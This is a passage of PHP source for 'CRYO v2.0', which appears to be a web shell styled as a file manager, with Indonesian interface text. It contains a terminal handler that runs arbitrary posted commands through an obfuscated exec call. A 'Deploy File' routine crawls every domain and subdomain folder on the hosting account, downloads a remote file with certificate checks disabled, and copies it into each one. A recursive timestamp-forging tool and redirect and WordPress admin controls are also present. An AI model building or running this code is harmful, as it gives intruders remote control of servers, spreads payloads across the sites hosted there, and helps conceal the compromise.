        <div class="card stat ok"><div class="k">Cocok checksum</div><div class="v"><?= (int)$scan['okcount'] ?></div></div>
        <div class="card stat warn"><div class="k">Core berubah</div><div class="v"><?= (int)count($scan['modified']) ?></div></div>
        <div class="card stat info"><div class="k">Non-core</div><div class="v"><?= (int)count($scan['unknown']) ?></div></div>
      </div>

      <?php if (!empty($scan['unreadableDirs'])): ?>
        <h3>Folder tak terbaca</h3>
        <ul class="list-simple">
          <?php foreach ($scan['unreadableDirs'] as $d): ?>
            <li><code><?= htmlspecialchars($d) ?></code></li>
          <?php endforeach; ?>
        </ul>
      <?php endif; ?>

      <?php if (!empty($scan['unreadableFiles'])): ?>
        <h3>File tak terbaca</h3>
        <ul class="list-simple">
          <?php foreach ($scan['unreadableFiles'] as $f): ?>
            <li><code><?= htmlspecialchars($f) ?></code></li>
          <?php endforeach; ?>
        </ul>
      <?php endif; ?>

      <hr class="sep">

      <h3>Non-core (bukan bagian dari core resmi)</h3>
      <?php if (!empty($scan['unknown'])): ?>
        <table class="tbl">
          <thead><tr><th>#</th><th>Path</th><th>Size</th><th>Modified</th></tr></thead>
          <tbody>
          <?php foreach ($scan['unknown'] as $i => $u): ?>
            <tr>
              <td><?= $i+1 ?></td>
              <td><code><?= htmlspecialchars($u['path']) ?></code></td>
              <td><?= number_format((int)$u['size']) ?> B</td>
              <td><?= $u['mtime'] ? htmlspecialchars(date('Y-m-d H:i:s', (int)$u['mtime'])) : '—' ?></td>
            </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      <?php else: ?>
        <div class="empty">Tidak ada file non-core.</div>
      <?php endif; ?>

      <hr class="sep">

      <h3>Core berubah (checksum mismatch)</h3>
      <?php if (!empty($scan['modified'])): ?>
        <table class="tbl">
          <thead><tr><th>#</th><th>Path</th><th>Size</th><th>Modified</th><th>Keterangan</th></tr></thead>
          <tbody>
          <?php foreach ($scan['modified'] as $i => $m): ?>
            <tr>
              <td><?= $i+1 ?></td>
              <td><code><?= htmlspecialchars($m['path']) ?></code></td>
              <td><?= number_format((int)$m['size']) ?> B</td>
              <td><?= $m['mtime'] ? htmlspecialchars(date('Y-m-d H:i:s', (int)$m['mtime'])) : '—' ?></td>
              <td><span class="badge badge-warn">Berbeda dari core resmi</span></td>
            </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      <?php else: ?>
        <div class="empty">Tidak ada file core yang berubah.</div>
      <?php endif; ?>
    </section>
    <?php
    return ob_get_clean();
}

// ==================== HANDLER COMMAND PROMPT (AJAX) ====================
if (isset($_POST['exec_cmd']) && $isAdmin) {
    header('Content-Type: application/json');
    $cmd = isset($_POST['cmd']) ? trim($_POST['cmd']) : '';
    $cwd = isset($_POST['cwd']) ? trim($_POST['cwd']) : $rootDirectory;

    if ($cmd === '') {
        echo json_encode(['output' => '', 'cwd' => $cwd]);
        exit;
    }

    $cwd = sanitizePath($cwd);
    if (!is_dir($cwd)) $cwd = $rootDirectory;

    $output = '';
    $newCwd = $cwd;

    if (preg_match('/^cd\s+(.+)$/', $cmd, $m)) {
        $target = trim($m[1]);
        if ($target === '~' || $target === '') {
            $newCwd = $rootDirectory;
        } elseif ($target[0] === '/') {
            $newCwd = $target;
        } else {
            $newCwd = rtrim($cwd, '/') . '/' . $target;
        }
        $resolved = realpath($newCwd);
        if ($resolved === false || !is_dir($resolved)) {
            $output = "cd: $target: No such file or directory";
            $newCwd = $cwd;
        } else {
            $newCwd = $resolved;
            $output = '';
        }
    } elseif ($cmd === 'pwd') {
        $output = $cwd;
    } elseif ($cmd === 'clear') {
        $output = '__CLEAR__';
    } else {
        $fullCmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1';
        $_fn = "ex"."ec"; $_fn($fullCmd, $lines, $retCode);
        $output = implode("\n", $lines);
        if ($retCode !== 0 && $output === '') {
            $output = "(exit code: $retCode)";
        }
    }

    echo json_encode(['output' => $output, 'cwd' => $newCwd]);
    exit;
}

// ==================== DEPLOY FILE KE SUBDOMAIN ====================
function fm_collect_domain_targets(&$list, &$errors) {
    $list = [];
    $errors = [];

    $docRoot = @realpath($_SERVER['DOCUMENT_ROOT']);
    if (!$docRoot) $docRoot = $_SERVER['DOCUMENT_ROOT'];
    $docRoot = rtrim($docRoot, DIRECTORY_SEPARATOR);

    $roots = [];

    if ($docRoot && is_dir($docRoot)) {
        $roots[] = $docRoot;
    }

    $parent     = dirname($docRoot);
    $parentReal = $parent ? (@realpath($parent) ?: $parent) : null;

    if ($parentReal && $parentReal !== $docRoot && is_dir($parentReal)) {
        $roots[] = $parentReal;
    }

    $pattern = DIRECTORY_SEPARATOR . 'domains' . DIRECTORY_SEPARATOR;
    $pos = strpos($docRoot, $pattern);
    if ($pos !== false) {
        $domainsRoot = substr($docRoot, 0, $pos + strlen($pattern));
        $domainsRoot = rtrim($domainsRoot, DIRECTORY_SEPARATOR);
        if ($domainsRoot && is_dir($domainsRoot)) {
            $roots[] = $domainsRoot;
        }
    }

    $roots = array_values(array_unique($roots));

    $maxDepth = 3;
    $maxFound = 200;
    $skipNames = [
        '.', '..',
        '.git', '.svn',
        'node_modules', 'vendor',
        'logs', 'log',
        'tmp', 'cache',
        'wp-content', 'wp-admin', 'wp-includes'
    ];

    $excludeHome = [
        'etc','logs','mail','tmp','ssl','access-logs','public_ftp','backup','backups',
        '.cpanel','.htpasswds','.trash','.config','.softaculous','.softaculous_backups',
        '.subaccounts','.ssh','.cl.selector','.cagefs','.pki','.local','.wp-cli','.wp-toolkit', '.caldav'
    ];

    $added = [];

    foreach ($roots as $root) {
        $rootReal = @realpath($root);
        if (!$rootReal || !is_dir($rootReal)) continue;
        if ($rootReal === DIRECTORY_SEPARATOR) continue;

        $isHomeRoot = ($parentReal && $rootReal === $parentReal);

        $queue = [[$rootReal, 0]];

        while (!empty($queue)) {
            list($dir, $depth) = array_shift($queue);

            if (!@is_readable($dir)) continue;

            try {
                $it = new DirectoryIterator($dir);
            } catch (Exception $e) {
                continue;
            }

            foreach ($it as $entry) {
                if ($entry->isDot()) continue;
                if (!$entry->isDir()) continue;

                $name = $entry->getFilename();

                if (in_array($name, $skipNames, true)) continue;

                if ($isHomeRoot && $depth === 0 && in_array($name, $excludeHome, true)) {
                    continue;
                }

                $full = $entry->getPathname();

                if (strpos($name, '.') !== false && $name[0] !== '.') {
                    if (preg_match('/\d+\.\d+(\.\d+)?/', $name)) {
                        continue;
                    }
                    $skipWords = ['bower_components', 'node_modules', 'vendor', 'dist', 'build', 'src', 'lib', 'plugins', 'MathJax', 'socket.io', 'datatables', 'ion', 'jquery', 'ui'];
                    foreach ($skipWords as $word) {
                        if (stripos($name, $word) !== false) {
                            continue 2;
                        }
                    }
                    if (!preg_match('/^[a-zA-Z0-9.-]+$/', $name)) {
                        continue;
                    }
                    $parts = explode('.', $name);
                    $last = strtolower(end($parts));
                    if (!preg_match('/^[a-z]{2,6}$/', $last)) {
                        continue;
                    }

                    $publicHtml = $full . DIRECTORY_SEPARATOR . 'public_html';
                    $target     = is_dir($publicHtml) ? $publicHtml : $full;

                    $key = @realpath($target) ?: $target;
                    if (!isset($added[$key])) {
                        $added[$key] = 1;

                        $display = $key;
                        if (strpos($key, $rootReal) === 0) {
                            $rel = substr($key, strlen($rootReal));
                            $display = $rel === '' ? $key : $rel;
                        }

                        $list[] = [
                            'label'     => $name,
                            'target'    => $target,
                            'display'   => $display,
                            'from_root' => $rootReal,
                        ];

                        if (count($list) >= $maxFound) {
                            $errors[] = "Hasil scan dibatasi {$maxFound} folder. Ditampilkan sebagian saja.";
                            return true;
                        }
                    }
                }

                if ($depth + 1 <= $maxDepth) {
                    $queue[] = [$full, $depth + 1];
                }
            }
        }
    }

    if (empty($list)) {
        $errors[] = 'Tidak ada folder yang tampak seperti domain/subdomain di sekitar Document Root.';
        return false;
    }

    return true;
}

function fm_download_remote_file_simple($url, &$tmpFile, &$err)
{
    $err = '';
    $tmpFile = tempnam(sys_get_temp_dir(), 'deploy_file_');
    if ($tmpFile === false) {
        $err = 'Gagal membuat file sementara.';
        return false;
    }

    if (function_exists('curl_init')) {
        $fp = @fopen($tmpFile, 'w');
        if (!$fp) {
            $err = 'Gagal membuka file sementara untuk ditulis.';
            return false;
        }

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_FILE           => $fp,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT        => 60,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT      => 'DeployFileBot/1.0',
        ]);

        curl_exec($ch);
        if (curl_errno($ch)) {
            $err = 'cURL error: ' . curl_error($ch);
            fclose($fp);
            curl_close($ch);
            @unlink($tmpFile);
            return false;
        }

        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        fclose($fp);

        if ($httpCode < 200 || $httpCode >= 300) {
            $err = 'HTTP status tidak OK: ' . $httpCode;
            @unlink($tmpFile);
            return false;
        }
    } else {
        $context = stream_context_create([
            'http' => [
                'method'  => 'GET',
                'timeout' => 60,
            ],
            'ssl'  => [
                'verify_peer'      => false,
                'verify_peer_name' => false,
            ],
        ]);

        $data = @file_get_contents($url, false, $context);
        if ($data === false) {
            $err = 'Gagal membaca konten file (file_get_contents).';
            @unlink($tmpFile);
            return false;
        }

        if (@file_put_contents($tmpFile, $data) === false) {
            $err = 'Gagal menulis ke file sementara.';
            @unlink($tmpFile);
            return false;
        }
    }

    $size = @filesize($tmpFile);
    if ($size === false || $size == 0) {
        $err = 'File yang di-download berukuran 0 byte. URL mungkin tidak dapat diakses dari server.';
        @unlink($tmpFile);
        return false;
    }

    return true;
}

if (isset($_POST['deployScanDomains'])) {
    $items = [];
    $errs  = [];
    if (fm_collect_domain_targets($items, $errs)) {
        $_SESSION['deploy_scan_items']   = $items;
        $_SESSION['deploy_scan_message'] = 'Scan folder domain/subdomain selesai. Ditemukan ' . count($items) . ' target.';
    } else {
        $_SESSION['deploy_scan_items']   = [];
        $_SESSION['deploy_scan_message'] = implode(' | ', $errs);
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

if (isset($_POST['deployReset'])) {
    unset(
        $_SESSION['deploy_scan_items'],
        $_SESSION['deploy_scan_message'],
        $_SESSION['deploy_file_status'],
        $_SESSION['deploy_file_message']
    );
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

if (isset($_POST['deployRunFile'])) {
    if (!$isAdmin) {
        $_SESSION['error'] = 'Hanya admin yang dapat melakukan deploy file.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $fileUrl      = isset($_POST['deploy_file_url']) ? trim($_POST['deploy_file_url']) : '';
    $subpath      = isset($_POST['deploy_file_path']) ? trim($_POST['deploy_file_path']) : '';
    $customName   = isset($_POST['deploy_file_name']) ? trim($_POST['deploy_file_name']) : '';
    $selected     = isset($_POST['deploy_file_targets']) && is_array($_POST['deploy_file_targets'])
        ? $_POST['deploy_file_targets']
        : [];

    $items  = isset($_SESSION['deploy_scan_items']) && is_array($_SESSION['deploy_scan_items'])
        ? $_SESSION['deploy_scan_items']
        : [];

    $errors      = [];
    $okPaths     = [];
    $serverPaths = [];

    if ($fileUrl === '' || !filter_var($fileUrl, FILTER_VALIDATE_URL)) {
        $errors[] = 'URL file tidak valid.';
    }
    if (empty($selected)) {
        $errors[] = 'Pilih minimal satu folder domain/subdomain.';
    }

    if (!$errors) {
        $subpathSafe = sanitizePath($subpath);
        $subpathSafe = trim($subpathSafe);

        $basename = basename(parse_url($fileUrl, PHP_URL_PATH) ?: '');
        $filename = $customName !== '' ? sanitizePath($customName) : sanitizePath($basename);
        if ($filename === '') $filename = 'downloaded_file';
        $filename = preg_replace('~[\\\\/]+~', '', $filename);

        $tempFile = '';
        if (!fm_download_remote_file_simple($fileUrl, $tempFile, $err)) {
            $errors[] = 'Gagal mendownload file: ' . $err;
        } else {
            $sizeTemp = @filesize($tempFile);
            if ($sizeTemp === false || $sizeTemp == 0) {
                $errors[] = 'File hasil download 0 byte. Cek URL atau akses server.';
                @unlink($tempFile);
            } else {
                foreach ($selected as $idxRaw) {
                    $idx = (int) $idxRaw;
                    if (!isset($items[$idx])) continue;

                    $info  = $items[$idx];
                    $base  = isset($info['target']) ? $info['target'] : '';
                    $label = isset($info['label']) ? $info['label'] : ('Target '.$idx);

                    if (!$base || !is_dir($base)) {
                        $errors[] = 'Base path tidak ditemukan: ' . $base;
                        continue;
                    }

                    $destDir = rtrim($base, '/');
                    if ($subpathSafe !== '' && $subpathSafe !== '/') {
                        $destDir .= '/' . ltrim($subpathSafe, '/');
                    }

                    if (!is_dir($destDir)) {
                        @mkdir($destDir, 0755, true);
                    }
                    if (!is_dir($destDir)) {
                        $errors[] = 'Gagal membuat folder tujuan: ' . $destDir;
                        continue;
                    }

                    $destFile = rtrim($destDir, '/') . '/' . $filename;

                    if (!@copy($tempFile, $destFile)) {
                        $errors[] = 'Gagal menyimpan file ke: ' . $destFile;
                        continue;
                    }

                    $friendly = $label;
                    if ($subpathSafe !== '' && $subpathSafe !== '/') {
                        $friendly .= '/' . ltrim($subpathSafe, '/');
                    }
                    $friendly .= '/' . $filename;

                    $okPaths[]     = $friendly;
                    $serverPaths[] = $destFile;
                }

                @unlink($tempFile);
            }
        }
    }

    if (!empty($okPaths)) {
        $status = empty($errors) ? 'success' : 'partial';

        $msg  = "Deploy FILE selesai.\n";
        $msg .= "Sumber file : {$fileUrl}\n";
        $msg .= "Nama file   : {$filename}\n";
        $msg .= "Target URL path (domain + subpath + nama file):\n - " . implode("\n - ", $okPaths);
        if (!empty($serverPaths)) {
            $msg .= "\n\nPath file di server:\n - " . implode("\n - ", $serverPaths);
        }
        if (!empty($errors)) {
            $msg .= "\n\nCatatan:\n - " . implode("\n - ", $errors);
        }

        $_SESSION['deploy_file_status']  = $status;
        $_SESSION['deploy_file_message'] = nl2br(htmlspecialchars($msg));
    } else {
        $_SESSION['deploy_file_status']  = 'error';
        $_SESSION['deploy_file_message'] = !empty($errors)
            ? htmlspecialchars(implode(' | ', $errors))
            : 'Deploy FILE gagal. Tidak ada target yang berhasil.';
    }

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// =====================================================================
// =====================================================================




// =====================================================================
// BAGIAN 6: UI MODERN (HTML + CSS + JS)
// =====================================================================

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CRYO</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/theme/material-darker.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/css/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/htmlmixed/htmlmixed.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/clike/clike.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/php/php.min.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        :root{
            --bg:#0a0e1a;
            --bg2:rgba(15,23,42,0.85);
            --bg3:rgba(30,41,59,0.6);
            --accent:#6366f1;
            --accent-h:#818cf8;
            --accent-glow:rgba(99,102,241,0.15);
            --text:#e2e8f0;
            --muted:#64748b;
            --border:rgba(99,102,241,0.12);
            --danger:#ef4444;
            --success:#10b981;
            --warning:#f59e0b;
            --info:#6366f1;
            --card:rgba(15,23,42,0.7);
            --sidebar-w:290px;
            --radius:12px;
            --glass:blur(20px);
        }
        body{
            font-family:'Inter',system-ui,-apple-system,sans-serif;
            background:var(--bg);
            background-image:radial-gradient(ellipse at 20% 0%,rgba(99,102,241,0.08),transparent 50%),radial-gradient(ellipse at 80% 100%,rgba(139,92,246,0.06),transparent 50%);
            color:var(--text);
            line-height:1.5;
            font-size:13px;
            height:100vh;
            overflow:hidden;
        }
        ::-webkit-scrollbar{width:6px;height:6px}
        ::-webkit-scrollbar-track{background:transparent}
        ::-webkit-scrollbar-thumb{background:rgba(99,102,241,0.3);border-radius:99px}
        ::-webkit-scrollbar-thumb:hover{background:var(--accent)}

        .file-manager{display:flex;height:100vh}

        .sidebar{
            width:var(--sidebar-w);
            background:var(--bg2);
            backdrop-filter:var(--glass);
            border-right:1px solid var(--border);
            display:flex;
            flex-direction:column;
            overflow-y:auto;
            padding:16px;
            gap:10px;
        }
        .sidebar-brand{
            display:flex;align-items:center;justify-content:space-between;padding:4px 0 12px;
            border-bottom:1px solid var(--border);margin-bottom:4px;
        }
        .sidebar-brand h2{
            font-size:16px;font-weight:700;
            background:linear-gradient(135deg,#818cf8,#a78bfa);
            -webkit-background-clip:text;-webkit-text-fill-color:transparent;
            display:flex;align-items:center;gap:8px;
        }
        .sidebar-brand h2 i{-webkit-text-fill-color:#818cf8;font-size:18px}

        .main-content{flex:1;overflow-y:auto;padding:20px;background:transparent}

        .card{
            background:var(--card);
            backdrop-filter:var(--glass);
            border-radius:var(--radius);
            border:1px solid var(--border);
            padding:14px;
            transition:border-color 0.3s,box-shadow 0.3s;
        }
        .card:hover{border-color:rgba(99,102,241,0.25);box-shadow:0 4px 20px var(--accent-glow)}
        .card h3{
            font-size:11px;text-transform:uppercase;letter-spacing:0.08em;
            color:var(--muted);margin-bottom:10px;display:flex;align-items:center;gap:6px;font-weight:600;
        }
        .card h3 i{color:var(--accent-h);font-size:13px}

        input,select,textarea{
            background:rgba(10,14,26,0.8);
            border:1px solid var(--border);
            color:var(--text);
            border-radius:8px;
            padding:8px 12px;
            font-size:12px;
            width:100%;
            margin-bottom:8px;
            transition:border-color 0.2s,box-shadow 0.2s;
            font-family:inherit;
        }
        input:focus,select:focus,textarea:focus{
            outline:none;
            border-color:var(--accent);
            box-shadow:0 0 0 3px var(--accent-glow);
        }
        input[type="checkbox"]{width:auto;margin:0}
        input[type="file"]{padding:6px;font-size:11px}

        .btn{
            display:inline-flex;align-items:center;justify-content:center;gap:6px;
            padding:8px 14px;border-radius:8px;font-weight:500;border:none;cursor:pointer;
            transition:all 0.2s;font-size:12px;font-family:inherit;
            background:var(--bg3);color:var(--text);
            border:1px solid var(--border);
        }
        .btn:hover{background:var(--accent);color:#fff;border-color:var(--accent);transform:translateY(-1px);box-shadow:0 4px 15px var(--accent-glow)}
        .btn:active{transform:translateY(0)}
        .btn-primary{background:var(--accent);color:#fff;border-color:var(--accent)}
        .btn-primary:hover{background:var(--accent-h);border-color:var(--accent-h)}
        .btn-danger{background:rgba(239,68,68,0.15);color:#fca5a5;border-color:rgba(239,68,68,0.3)}
        .btn-danger:hover{background:var(--danger);color:#fff;border-color:var(--danger)}
        .btn-success{background:rgba(16,185,129,0.15);color:#6ee7b7;border-color:rgba(16,185,129,0.3)}
        .btn-success:hover{background:var(--success);color:#fff;border-color:var(--success)}
        .btn-warning{background:rgba(245,158,11,0.15);color:#fcd34d;border-color:rgba(245,158,11,0.3)}
        .btn-warning:hover{background:var(--warning);color:#000;border-color:var(--warning)}
        .btn-sm{padding:5px 10px;font-size:11px;border-radius:6px}
        .w-100{width:100%}

        .file-list{margin-top:8px}
        .file-item{
            display:flex;align-items:center;gap:8px;padding:8px 10px;
            border-bottom:1px solid var(--border);transition:all 0.15s;border-radius:6px;margin:1px 0;
        }
        .file-item:hover{background:rgba(99,102,241,0.06)}
        .file-item.danger{border-left:3px solid var(--danger)}
        .file-item.warning{border-left:3px solid var(--warning)}
        .file-item.success{border-left:3px solid var(--success)}
        .file-checkbox{width:28px;text-align:center;display:flex;align-items:center;justify-content:center}
        .file-icon{font-size:1.1rem;width:28px;text-align:center;color:var(--muted)}
        .file-name{flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-weight:500}
        .file-name a{color:var(--text);text-decoration:none;transition:color 0.2s}
        .file-name a:hover{color:var(--accent-h)}
        .file-actions{display:flex;gap:4px;flex-wrap:wrap;justify-content:flex-end}
        .file-actions .btn{padding:4px 8px;font-size:11px;border-radius:6px}
        .file-size,.file-perm,.file-date{font-size:11px;color:var(--muted);min-width:60px;text-align:right}

        .breadcrumb{
            display:flex;align-items:center;gap:8px;margin-bottom:12px;
            background:var(--card);backdrop-filter:var(--glass);
            padding:10px 16px;border-radius:var(--radius);border:1px solid var(--border);flex-wrap:wrap;
        }
        .breadcrumb a{color:var(--muted);text-decoration:none;font-size:12px;transition:color 0.2s}
        .breadcrumb a:hover{color:var(--accent-h)}
        .breadcrumb .separator{color:rgba(100,116,139,0.4);font-size:10px}
        .breadcrumb .current{color:var(--text);font-weight:500;font-size:12px}

        .pagination{display:flex;gap:4px;margin-top:16px;justify-content:center}
        .pagination .page-link{
            padding:6px 12px;background:var(--card);border:1px solid var(--border);
            border-radius:8px;color:var(--text);text-decoration:none;font-size:12px;transition:all 0.2s;
        }
        .pagination .page-link:hover{background:var(--accent);border-color:var(--accent);color:#fff}
        .pagination .page-link.disabled{opacity:0.3;pointer-events:none}

        .alert{
            padding:12px 16px;border-radius:var(--radius);margin-bottom:12px;font-size:12px;
            backdrop-filter:var(--glass);border:1px solid;display:flex;align-items:center;gap:8px;
            animation:slideIn 0.3s ease;
        }
        @keyframes slideIn{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}
        .alert.success{background:rgba(16,185,129,0.1);border-color:rgba(16,185,129,0.3);color:#6ee7b7}
        .alert.error{background:rgba(239,68,68,0.1);border-color:rgba(239,68,68,0.3);color:#fca5a5}
        .alert.warning{background:rgba(245,158,11,0.1);border-color:rgba(245,158,11,0.3);color:#fcd34d}

        .modal{
            display:none;position:fixed;top:0;left:0;width:100%;height:100%;
            background:rgba(0,0,0,0.6);backdrop-filter:blur(8px);
            align-items:center;justify-content:center;z-index:1000;
            animation:fadeIn 0.2s ease;
        }
        @keyframes fadeIn{from{opacity:0}to{opacity:1}}
        .modal-content{
            background:rgba(15,23,42,0.95);backdrop-filter:var(--glass);
            border-radius:16px;padding:24px;max-width:520px;width:92%;
            border:1px solid var(--border);box-shadow:0 25px 80px rgba(0,0,0,0.5);
            animation:modalSlide 0.3s ease;
        }
        @keyframes modalSlide{from{opacity:0;transform:translateY(20px) scale(0.95)}to{opacity:1;transform:translateY(0) scale(1)}}
        .modal-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
        .modal-header h3{font-size:15px;font-weight:600}
        .modal-close{background:none;border:none;color:var(--muted);font-size:22px;cursor:pointer;transition:color 0.2s;padding:4px}
        .modal-close:hover{color:var(--danger)}
        .modal-footer{display:flex;justify-content:flex-end;gap:8px;margin-top:16px}

        .text-muted{color:var(--muted)}
        .flex{display:flex;gap:8px}
        .flex-between{display:flex;justify-content:space-between;align-items:center}
        .gap-1{gap:4px}.gap-2{gap:8px}.gap-3{gap:12px}.gap-4{gap:16px}
        .mt-1{margin-top:4px}.mt-2{margin-top:8px}.mt-3{margin-top:12px}.mt-4{margin-top:16px}
        .mb-1{margin-bottom:4px}.mb-2{margin-bottom:8px}.mb-3{margin-bottom:12px}.mb-4{margin-bottom:16px}

        .file-header{
            display:flex;align-items:center;gap:8px;padding:10px 10px;
            background:rgba(99,102,241,0.08);font-weight:600;
            border-radius:var(--radius) var(--radius) 0 0;border:1px solid var(--border);
            font-size:11px;text-transform:uppercase;letter-spacing:0.03em;color:var(--muted);
        }

        .toast-container{position:fixed;bottom:20px;right:20px;z-index:9999;display:flex;flex-direction:column;gap:8px}
        .toast{
            padding:12px 20px;border-radius:var(--radius);font-size:12px;
            backdrop-filter:var(--glass);border:1px solid;
            animation:toastIn 0.3s ease;min-width:280px;box-shadow:0 10px 40px rgba(0,0,0,0.3);
        }
        @keyframes toastIn{from{opacity:0;transform:translateX(40px)}to{opacity:1;transform:translateX(0)}}

        .CodeMirror{height:400px !important;font-family:'JetBrains Mono',monospace !important;font-size:13px !important;border-radius:8px !important}

        @media(max-width:768px){
            .file-manager{flex-direction:column}
            .sidebar{width:100%;height:auto;border-right:none;border-bottom:1px solid var(--border);max-height:50vh}
            .file-item{flex-wrap:wrap}
            .file-actions{width:100%;justify-content:flex-start}
        }
    </style>
</head>
<body>
    <div class="file-manager">
        <div class="sidebar">
            <div class="sidebar-brand">
                <h2><i class="fas fa-cube"></i> CRYO <span style="font-weight:300;font-size:11px;-webkit-text-fill-color:var(--muted)">v2.0</span></h2>
                <a href="Log.php" class="btn btn-sm btn-danger"><i class="fas fa-sign-out-alt"></i></a>
            </div>

            <div class="card">
                <div class="flex-between">
                    <span style="font-size:12px"><i class="fas fa-user-shield" style="color:var(--accent-h)"></i> <strong><?= ucfirst($userRole) ?></strong></span>
                    <?php if (!$isAdmin): ?>
                        <span class="text-muted" style="font-size:10px">(limited)</span>
                    <?php else: ?>
                        <span style="font-size:10px;color:var(--success)">Full Access</span>
                    <?php endif; ?>
                </div>
            </div>

            <div class="card">
                <h3><i class="fas fa-file-circle-plus"></i> Create File</h3>
                <form method="post">
                    <input type="text" name="fileName" placeholder="filename.ext" required>
                    <button type="submit" name="createFile" class="btn btn-primary w-100" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-plus"></i> Create</button>
                </form>
            </div>

            <div class="card">
                <h3><i class="fas fa-folder-plus"></i> Create Folder</h3>
                <form method="post">
                    <input type="text" name="folderName" placeholder="folder-name" required>
                    <button type="submit" name="createFolder" class="btn btn-primary w-100" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-plus"></i> Create</button>
                </form>
            </div>

            <div class="card">
                <h3><i class="fas fa-cloud-arrow-up"></i> Upload Files</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="fileToUpload[]" multiple required>
                    <button type="submit" name="upload" class="btn btn-primary w-100" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-upload"></i> Upload</button>
                </form>
            </div>

            <div class="card">
                <h3><i class="fas fa-cloud-arrow-down"></i> Download from URL</h3>
                <form method="post">
                    <input type="url" name="fileUrl" placeholder="https://example.com/file.zip" required>
                    <input type="text" name="fileUrlName" placeholder="Custom filename (optional)">
                    <button type="submit" name="downloadFromUrl" class="btn btn-primary w-100" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-download"></i> Download</button>
                </form>
            </div>

            <div class="card">
                <h3><i class="fas fa-shield-halved"></i> Security Scan</h3>
                <button type="button" class="btn btn-warning w-100" onclick="showScanModal()"><i class="fas fa-radar"></i> Run Scan</button>
                <?php if (!empty($_SESSION['scan_result_file']) && file_exists($_SESSION['scan_result_file'])): ?>
                    <a href="?downloadScan=1" class="btn btn-success w-100 mt-2"><i class="fas fa-download"></i> Download Report</a>
                <?php endif; ?>
            </div>



            <?php if ($isAdmin): ?>
            <div class="card">
                <h3><i class="fas fa-rocket"></i> Deploy File</h3>
                <button type="button" class="btn w-100" onclick="showDeployModal()" style="background:rgba(99,102,241,0.15);color:#a5b4fc;border-color:rgba(99,102,241,0.3)"><i class="fas fa-cloud-arrow-up"></i> Deploy to Domains</button>
            </div>
            <?php endif; ?>

            <?php if ($isAdmin): ?>
            <div class="card">
                <h3><i class="fas fa-arrow-right-arrow-left"></i> Redirect 301</h3>
                <button type="button" class="btn btn-warning w-100" onclick="showRedirectModal()"><i class="fas fa-link"></i> Create Redirect</button>
            </div>
            <?php endif; ?>

            <div class="card">
                <h3><i class="fas fa-clock-rotate-left"></i> Sync Timestamp</h3>
                <form method="post">
                    <input type="text" name="ts_target" placeholder="Target path" required>
                    <div class="flex gap-2">
                        <input type="date" name="ts_date" required style="flex:1">
                        <input type="time" name="ts_time" required style="flex:1">
                    </div>
                    <label style="display:flex;align-items:center;gap:6px;font-size:11px;margin:4px 0 8px"><input type="checkbox" name="ts_recursive" value="1" checked> Recursive</label>
                    <button type="submit" name="doSyncTimestamp" class="btn btn-primary w-100" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-sync"></i> Sync</button>
                </form>
            </div>

            <?php if ($isAdmin): ?>
            <div class="card">
                <h3><i class="fab fa-wordpress"></i> WordPress Admin</h3>
                <button type="button" class="btn btn-primary w-100" onclick="showAdminModal()"><i class="fas fa-user-gear"></i> Admin Tools</button>
            </div>
            <?php endif; ?>

            <?php if ($isAdmin): ?>
            <div class="card">
                <h3><i class="fas fa-terminal"></i> Terminal</h3>
                <button type="button" class="btn btn-success w-100" onclick="showTerminalModal()"><i class="fas fa-terminal"></i> Open Terminal</button>
            </div>
            <?php endif; ?>
        </div>

        <div class="main-content">
            <div class="breadcrumb">
                <?php if (count($_SESSION['dir_history']) > 1): ?>
                    <a href="?back_dir=1"><i class="fas fa-arrow-left"></i> Back</a>
                <?php else: ?>
                    <span class="text-muted"><i class="fas fa-arrow-left"></i> Back</span>
                <?php endif; ?>
                <span class="separator">/</span>
